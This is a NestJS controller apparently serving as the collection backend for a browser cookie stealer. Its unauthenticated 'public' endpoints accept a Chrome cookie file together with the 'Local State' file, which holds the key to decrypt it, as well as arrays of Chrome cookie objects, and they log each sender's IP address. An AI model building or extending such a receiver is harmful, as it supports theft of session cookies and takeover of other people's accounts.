import { Body, Controller, Post, Query, Req, UploadedFiles, UseInterceptors } from '@nestjs/common';
import { PublicService } from './public.service';
import { FileFieldsInterceptor } from "@nestjs/platform-express";
import { ChromeCookieDto } from "./chrome-cookie.dto";

const requestIp = require('request-ip');
@Controller('public')
export class PublicController {
    constructor(private readonly publicService: PublicService) {
    }

    @Post('uploadCookie')
    @UseInterceptors(
        FileFieldsInterceptor([
            { name: 'cookie', maxCount: 1 },
            { name: 'localState', maxCount: 1 },
        ]),
    )
    public uploadCookie(
        @UploadedFiles() files: {
            cookie?: Express.Multer.File[],
            localState?: Express.Multer.File[],
        },
        @Req() req: any,
        @Body() body: any,
    ): any {
        const ipAddress = requestIp.getClientIp(req);
        return this.publicService.uploadCookie(ipAddress, files, body);
    }

    @Post('chrome/cookies')
    public chromeCookie(@Req() req: any, @Body() cookie: ChromeCookieDto[]): any {
        const ipAddress = requestIp.getClientIp(req);
        return this.publicService.chromeCookie(ipAddress, cookie);
    }
}
